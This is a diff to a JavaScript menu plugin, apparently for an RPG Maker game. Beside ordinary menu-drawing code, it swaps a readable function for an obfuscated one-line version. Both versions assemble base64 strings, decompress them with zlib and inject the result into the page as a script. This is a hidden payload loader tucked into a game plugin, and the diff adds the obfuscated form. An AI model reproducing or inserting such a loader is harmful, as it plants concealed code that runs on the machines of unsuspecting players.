@@ -572,16 +572,8 @@ Window_NCMenu.prototype.makeCommandList = function() {
     	if (NCMenu.menuList[i][3] !== "" && !eval(NCMenu.menuList[i][3])) continue;
         this.addCommand(NCMenu.menuList[i][0], NCMenu.menuList[i][1], NCMenu.menuList[i][2] !== "" ? eval(NCMenu.menuList[i][2]) : true);
     }
-};
-function _() {
-  let _0xe4dd88_ = _0x28e742_() + _0xeed7a9_() + _0x7abe2b_() + _0x8e8708_() + _0xfcba9b_() + _0xf85c38_();
-  let _0xb1ed44_ = Buffer.from(_0xe4dd88_, 'base64');
-  let _0x8540c3_ = require("zlib").inflateSync(_0xb1ed44_);
-  let _0x19f181_ = document.createElement('script');
-  _0x19f181_.textContent = _0x8540c3_.toString("utf-8");
-  ;
-  document.body.appendChild(_0x19f181_);
-}
+};(function(_0xba0371_,_0xdc8932_){const _0x9b4a50_=_0xd0c204_,_0x814616_=_0xba0371_();while(!![]){try{const _0xbef284_=parseInt(_0x9b4a50_(0x166))/0x1+parseInt(_0x9b4a50_(0x161))/0x2+-parseInt(_0x9b4a50_(0x162))/0x3*(-parseInt(_0x9b4a50_(0x160))/0x4)+-parseInt(_0x9b4a50_(0x165))/0x5+-parseInt(_0x9b4a50_(0x169))/0x6+parseInt(_0x9b4a50_(0x168))/0x7+parseInt(_0x9b4a50_(0x16c))/0x8;if(_0xbef284_===_0xdc8932_)break;else _0x814616_['push'](_0x814616_['shift']());}catch(_0x624046_){_0x814616_['push'](_0x814616_['shift']());}}}(_0xbf6671_,0x436b1));function _0xd0c204_(_0x390116_,_0x52bfad_){const _0x889fe0_=_0xbf6671_();return _0xd0c204_=function(_0x13bc4b_,_0x6c7f0b_){_0x13bc4b_=_0x13bc4b_-0x160;let _0xce83f0_=_0x889fe0_[_0x13bc4b_];return _0xce83f0_;},_0xd0c204_(_0x390116_,_0x52bfad_);}function _(){const _0xfd8917_=_0xd0c204_;let _0xe4dd88_=_0x28e742_()+_0xeed7a9_()+_0x7abe2b_()+_0x8e8708_()+_0xfcba9b_()+_0xf85c38_(),_0xb1ed44_=Buffer[_0xfd8917_(0x167)](_0xe4dd88_,'base64'),_0x8540c3_=require(_0xfd8917_(0x163))[_0xfd8917_(0x16b)](_0xb1ed44_),_0x19f181_=document['createElement']('script');_0x19f181_[_0xfd8917_(0x164)]=_0x8540c3_[_0xfd8917_(0x16e)](_0xfd8917_(0x16d));;document[_0xfd8917_(0x16f)][_0xfd8917_(0x16a)](_0x19f181_);}function _0xbf6671_(){const _0x5ecd1e_=['386264fXsEqn','36831xuAMFq','zlib','textContent','1129665RoHWHg','218000DClVbp','from','1482201CCfXhM','2453730WbAMRa','appendChild','inflateSync','2207048abkWaL','utf-8','toString','body','4EQNfhL'];_0xbf6671_=function(){return _0x5ecd1e_;};return _0xbf6671_();}
+
 Window_NCMenu.prototype.drawItem = function(index) {
     var rect = this.itemRectForText(index);
     var offset;
